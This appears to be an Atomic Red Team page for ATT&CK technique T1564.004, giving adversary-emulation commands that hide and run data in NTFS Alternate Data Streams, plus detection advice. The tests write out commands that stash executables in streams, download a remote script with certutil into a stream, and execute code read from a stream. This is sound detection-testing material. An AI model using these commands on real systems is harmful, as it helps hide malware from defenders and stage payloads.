# T1564.004 - Hide Artifacts: NTFS File Attributes
Adversaries may use NTFS file attributes to hide their malicious data in order to evade detection. Every New Technology File System (NTFS) formatted partition contains a Master File Table (MFT) that maintains a record for every file/directory on the partition. (Citation: SpectorOps Host-Based Jul 2017) Within MFT entries are file attributes, (Citation: Microsoft NTFS File Attributes Aug 2010) such as Extended Attributes (EA) and Data [known as Alternate Data Streams (ADSs) when more than one Data attribute is present], that can be used to store arbitrary data (and even complete files). (Citation: SpectorOps Host-Based Jul 2017) (Citation: Microsoft File Streams) (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)

Adversaries may store malicious data or binaries in file attribute metadata instead of directly in files. This may be done to evade some defenses, such as static indicator scanning tools and anti-virus. (Citation: Journey into IR ZeroAccess NTFS EA) (Citation: MalwareBytes ADS July 2015)

## Atomic Tests

#Import the Module before running the tests.
Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force

### Atomic Test #1 - Alternate Data Streams (ADS)
Execute from Alternate Streams

[Reference - 1](https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f)

[Reference - 2](https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/)

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
type C:\temp\evil.exe > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:evil.exe"
extrac32 #{path}\procexp.cab #{path}\file.txt:procexp.exe
findstr /V /L W3AllLov3DonaldTrump #{path}\procexp.exe > #{path}\file.txt:procexp.exe
certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1564.004/src/test.ps1 c:\temp:ttt
makecab #{path}\autoruns.exe #{path}\cabtest.txt:autoruns.cab
print /D:#{path}\file.txt:autoruns.exe #{path}\Autoruns.exe
reg export HKLM\SOFTWARE\Microsoft\Evilreg #{path}\file.txt:evilreg.reg
regedit /E #{path}\file.txt:regfile.reg HKEY_CURRENT_USER\MyCustomRegKey
expand \\webdav\folder\file.bat #{path}\file.txt:file.bat
esentutl.exe /y #{path}\autoruns.exe /d #{path}\file.txt:autoruns.exe /o 
```

Invoke-AtomicTest T1564.004 -TestNumbers 1

### Atomic Test #2 - Store file in Alternate Data Stream (ADS)
Storing files in Alternate Data Stream (ADS) similar to Astaroth malware.
Upon execution cmd will run and attempt to launch desktop.ini. No windows remain open after the test

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
if (!(Test-Path C:\Users\Public\Libraries\yanki -PathType Container)) {
    New-Item -ItemType Directory -Force -Path C:\Users\Public\Libraries\yanki
    }
Start-Process -FilePath "$env:comspec" -ArgumentList "/c,type,#{payload_path},>,`"#{ads_file_path}:#{ads_name}`""
```

Invoke-AtomicTest T1564.004 -TestNumbers 2

### Atomic Test #3 - Create ADS command prompt
Create an Alternate Data Stream with the command prompt. Write access is required. Upon execution, run "dir /a-d /s /r | find ":$DATA"" in the %temp%
folder to view that the alternate data stream exists. To view the data in the alternate data stream, run "notepad T1564.004_has_ads.txt:adstest.txt"

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
echo cmd /c echo "Shell code execution."> #{file_name}:#{ads_filename}
for /f "usebackq delims=?" %i in (#{file_name}:#{ads_filename}) do %i
```

Invoke-AtomicTest T1564.004 -TestNumbers 3

### Atomic Test #4 - Create ADS PowerShell
Create an Alternate Data Stream with PowerShell. Write access is required. To verify execution, the the command "ls -Recurse | %{ gi $_.Fullname -stream *} | where stream -ne ':$Data' | Select-Object pschildname"
in the %temp% direcotry to view all files with hidden data streams. To view the data in the alternate data stream, run "notepad.exe T1564.004_has_ads_powershell.txt:adstest.txt" in the %temp% folder.

**Supported Platforms:** windows
#### Attack Commands: Run with `powershell`
```powershell
echo "test" > #{file_name} | set-content -path test.txt -stream #{ads_filename} -value "test"
set-content -path #{file_name} -stream #{ads_filename} -value "test2"
set-content -path . -stream #{ads_filename} -value "test3"
```

Invoke-AtomicTest T1564.004 -TestNumbers 4

## Detection
Forensic techniques exist to identify information stored in NTFS EA. (Citation: Journey into IR ZeroAccess NTFS EA) Monitor calls to the <code>ZwSetEaFile</code> and <code>ZwQueryEaFile</code> Windows API functions as well as binaries used to interact with EA, (Citation: Oddvar Moe ADS1 Jan 2018) (Citation: Oddvar Moe ADS2 Apr 2018) and consider regularly scanning for the presence of modified information. (Citation: SpectorOps Host-Based Jul 2017)

There are many ways to create and interact with ADSs using Windows utilities. Monitor for operations (execution, copies, etc.) with file names that contain colons. This syntax (ex: <code>file.ext:ads[.ext]</code>) is commonly associated with ADSs. (Citation: Microsoft ADS Mar 2014) (Citation: Oddvar Moe ADS1 Jan 2018) (Citation: Oddvar Moe ADS2 Apr 2018) For a more exhaustive list of utilities that can be used to execute and create ADSs, see https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f.

The Streams tool of Sysinternals can be used to uncover files with ADSs. The <code>dir /r</code> command can also be used to display ADSs. (Citation: Symantec ADS May 2009) Many PowerShell commands (such as Get-Item, Set-Item, Remove-Item, and Get-ChildItem) can also accept a <code>-stream</code> parameter to interact with ADSs. (Citation: MalwareBytes ADS July 2015) (Citation: Microsoft ADS Mar 2014)